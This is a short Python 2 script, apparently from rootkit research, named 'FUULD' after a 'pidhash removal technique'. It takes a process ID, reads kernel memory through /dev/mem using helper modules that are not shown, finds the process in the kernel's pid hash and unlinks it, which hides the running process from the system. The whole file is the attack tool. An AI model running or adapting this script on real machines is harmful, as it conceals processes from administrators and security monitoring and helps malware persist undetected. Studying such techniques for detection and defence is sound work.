#!/usr/bin/python

"""
FUULD using the pidhash removal technique.
Now in Python!

Ryan Riley
rriley.cs@gmail.com
"""

import os, sys
from ctypes import *

from kstructs import *
from memreader import *
from symbolfinder import *
from pidhash import *


if len(sys.argv) != 2:
	print "Usage: ",
	print sys.argv[0],
	print " <pid to remove>"
	sys.exit(-1)

the_pid = int(sys.argv[1])

sf = SymbolFinder()
dm = DevMemReader(sf)


ph = PidHash(sf,dm)
t = ph.find(the_pid)
if t != None:
	print "Found " + str(t.nr)
	t.pid_chain.remove(dm)
